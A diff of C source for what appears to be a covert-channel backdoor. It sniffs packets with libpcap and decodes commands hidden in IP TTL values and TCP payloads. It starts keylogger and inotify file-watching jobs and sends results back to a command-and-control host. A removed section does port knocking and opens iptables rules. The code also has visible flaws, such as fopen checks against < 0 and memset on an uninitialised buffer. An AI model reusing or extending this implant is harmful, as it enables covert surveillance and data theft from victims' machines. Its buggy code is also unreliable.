@@ -1,6 +1,6 @@
 #include "libpcap.h"
 
-int Packetcapture(char *filter, struct filter Filter){
+int Packetcapture(char *filter, struct filter *Filter){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
@@ -111,39 +111,9 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
             case COMMAND:
                 Filter->flag = COMMAND;
                 if(Filter->tcp == false) {
-                    if((fp = fopen(FILENAME, "ab+")) < 0){
-                        perror("fopen");
-                        exit(1);
-                    }
-
-                    if(ip->ip_ttl == 4) {
-                        fclose(fp);
-                        pcap_breakloop(interfaceinfo);
-
-                    }
-
-                    char ch[1];
-                    memset(ch,0, strlen(ch));
-                    ch[0] = (char)ip->ip_ttl;
-                    fprintf(fp,"%c", ch[0]);
-                    fflush(fp);
-                    fclose(fp);
+                    WriteUDPFile(ip->ip_ttl);
                 } else {
-                    if((fp = fopen(FILENAME, "wb+")) < 0){
-                        perror("fopen");
-                        exit(1);
-                    }
-
-                    //because safety
-                    unsigned char buf[BUFSIZE + 16];
-                    strncpy(buf, ParseTCPPayload(packet), sizeof(buf));
-                    printf("Payload: %s", buf);
-
-                    if((fwrite(buf, strlen((const char*)buf), sizeof(char), fp)) <= 0){
-                        perror("fwrite");
-                        exit(1);
-                    }
-                    fclose(fp);
+                    WriteTCPFile(ip->ip_ttl, packet);
                 }
 
                 break;
@@ -160,7 +130,14 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
             case INOTIFY:
                 Filter->flag = INOTIFY;
                 printf("INOTIFY\n");
+
                 //write to inotify file
+                if(Filter->tcp == false) {
+                    WriteUDPFile(ip->ip_ttl);
+                } else {
+                    WriteTCPFile(ip->ip_ttl, packet);
+                }
+
                 break;
             case EOT:   //wait for EOT packet before sending results back to the cnc
                 printf("EOT\n");
@@ -182,11 +159,27 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                         send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
                         break;
                     case INOTIFY:
+                        //read from the results file
+                        if((fp = fopen(FILENAME, "rb+")) < 0){
+                            perror("fopen");
+                            exit(1);
+                        }
+
+                        char *directory = NULL;
+                        char *file = NULL;
+                        size_t size;
+
+                        getline(&directory, &size, fp);
+                        getline(&file, &size, fp);
+
+                        printf("directory: %s\n", directory);
+                        printf("file: %s\n", file);
+
                         //start inotify
-                        //when completed, copy inotify file to results file
-                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, Filter->flag);
+                        watch_directory(Filter->targetip, Filter->localip, directory, file, Filter->tcp);
                         break;
                 }
+
                 break;
             default:
                 printf("DEBUG: Packet tossed wrong key\n");
@@ -195,6 +188,48 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     }
 
     fclose(fp);
+}
+
+void WriteUDPFile(int ttl) {
+    FILE *fp;
+    if((fp = fopen(FILENAME, "ab+")) < 0){
+        perror("fopen");
+        exit(1);
+    }
+
+    if(ttl == 4) {
+        fclose(fp);
+        pcap_breakloop(interfaceinfo);
+
+    }
+
+    char ch[1];
+    memset(ch,0, strlen(ch));
+    ch[0] = (char)ttl;
+    fprintf(fp,"%c", ch[0]);
+    fflush(fp);
+    fclose(fp);
+}
+
+void WriteTCPFile(int ttl, const u_char* packet) {
+    FILE *fp;
+
+    if((fp = fopen(FILENAME, "wb+")) < 0){
+        perror("fopen");
+        exit(1);
+    }
+
+    //because safety
+    unsigned char buf[BUFSIZE + 16];
+    strncpy(buf, ParseTCPPayload(packet), sizeof(buf));
+    printf("Payload: %s", buf);
+
+    if((fwrite(buf, strlen((const char*)buf), sizeof(char), fp)) <= 0){
+        perror("fwrite");
+        exit(1);
+    }
+    fclose(fp);
+
 }
 
 const unsigned char *ParseTCPPayload(const u_char* packet) {
@@ -353,80 +388,3 @@ void CreateFilter(char *buffer, bool tcp){
     strncat(buffer, PORT, sizeof(PORT));
 }
 
-/*
-void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, bool tcpp){
-    const struct sniff_tcp *tcp=0;
-    const struct my_ip *ip;
-    const char *payload;
-    int size_ip;
-    int size_tcp;
-    int size_payload;
-
-    if(send){
-        unsigned char data[BUFSIZE] = "";
-        printf("PORT KNOCKING\n");
-        SendPattern(data, Filter, tcpp);
-    } else {
-        //parse the tcp packet and check for key and port knocking packets
-        if(tcpp){
-
-            ip = (struct my_ip*)(packet + 14);
-            size_ip = IP_HL(ip)*4;
-
-            tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
-            size_tcp = TH_OFF(tcp)*4;
-
-            if(size_tcp < 20){
-                perror("TCP: Control packet length is incorrect");
-                exit(1);
-            }
-
-            payload = (u_char *)(packet + 14 + size_ip + size_tcp);
-
-            size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
-
-            for(int k = 0; k < Filter->amount; k++){
-                if(Filter->port_short[k] == ntohs(tcp->th_dport)){
-                    Filter->pattern[k] = 1;
-                }
-            }
-            if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
-                iptables(Filter->targetip, true, PORT, true, false);
-                char *dip = Filter->targetip;
-                printf("WAITING FOR DATA\n");
-                recv_results(dip, UPORT, RESULT_FILE, true);
-                iptables(Filter->targetip, true, PORT, true, true);
-                pcap_breakloop(interfaceinfo);
-            }
-        } else {
-            ip = (struct my_ip*)(packet + sizeof(struct ether_header));
-            const struct sniff_udp *udpheader;
-            udpheader = (struct sniff_udp*)(packet + 14 + (IP_HL(ip)*4));
-
-            for(int k = 0; k < Filter->amount; k++){
-                if(Filter->port_short[k] == ntohs(udpheader->uh_sport)){
-                    Filter->pattern[k] = 1;
-                }
-            }
-            if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
-                iptables(Filter->targetip, false, PORT, true, false);
-                printf("WAITING FOR DATA\n");
-                recv_results(Filter->localip, UPORT, RESULT_FILE, false);
-                iptables(Filter->targetip, false, PORT, true, true);
-                pcap_breakloop(interfaceinfo);
-            }
-        }
-    }
-}
-
-
-void SendPattern(unsigned char *data, struct filter *Filter, bool tcp){
-    for(int i = 0; i < Filter->amount; i++){
-        if(tcp){
-            covert_send(Filter->localip, Filter->targetip, Filter->port_short[i], Filter->port_short[i], data, 2);
-        } else {
-            covert_udp_send(Filter->localip, Filter->targetip, Filter->port_short[i], Filter->port_short[i], data, 2);
-        }
-    }
-}
-*/
